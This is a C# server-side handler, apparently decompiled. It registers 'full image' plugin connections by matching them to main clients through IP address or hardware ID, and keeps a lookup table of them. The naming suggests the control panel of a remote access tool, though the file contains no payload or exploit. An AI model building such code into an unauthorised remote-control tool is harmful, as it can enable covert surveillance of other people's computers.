using System.Collections;
using System.Collections.Generic;
using System.Windows.Forms;
using Server.Connectings;

namespace Server.Messages;

internal class HandlerFullImageOpen
{
	private static readonly Dictionary<string, Clients> pluginClients = new Dictionary<string, Clients>();

	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			client?.Disconnect();
		}
		else if (objects[1] == null || !(objects[1] is string status))
		{
			client.Disconnect();
		}
		else
		{
			if (status != "Ready")
			{
				return;
			}
			if (string.IsNullOrEmpty(client.IP) && string.IsNullOrEmpty(client.Hwid))
			{
				client.Disconnect();
				return;
			}
			Clients mainClient = FindMainClient(client.IP, client.Hwid);
			if (mainClient != null && !string.IsNullOrEmpty(mainClient.Hwid))
			{
				lock (pluginClients)
				{
					pluginClients[mainClient.Hwid] = client;
					return;
				}
			}
			client.Disconnect();
		}
	}

	private static Clients FindMainClient(string ip, string hwid)
	{
		if (Program.form?.GridClients?.Rows == null)
		{
			return null;
		}
		foreach (DataGridViewRow item in (IEnumerable)Program.form.GridClients.Rows)
		{
			if (item?.Tag is Clients client && client != null && !string.IsNullOrEmpty(ip) && client.IP == ip)
			{
				return client;
			}
		}
		if (!string.IsNullOrEmpty(hwid))
		{
			foreach (DataGridViewRow item2 in (IEnumerable)Program.form.GridClients.Rows)
			{
				if (item2?.Tag is Clients client2 && client2 != null && client2.Hwid == hwid)
				{
					return client2;
				}
			}
		}
		return null;
	}

	public static Clients GetPluginClient(string hwid)
	{
		if (string.IsNullOrEmpty(hwid))
		{
			return null;
		}
		lock (pluginClients)
		{
			if (pluginClients.TryGetValue(hwid, out var client))
			{
				if (client != null && client.itsConnect)
				{
					return client;
				}
				pluginClients.Remove(hwid);
			}
		}
		return null;
	}

	public static void RemovePluginClient(string hwid)
	{
		if (string.IsNullOrEmpty(hwid))
		{
			return;
		}
		lock (pluginClients)
		{
			pluginClients.Remove(hwid);
		}
	}
}
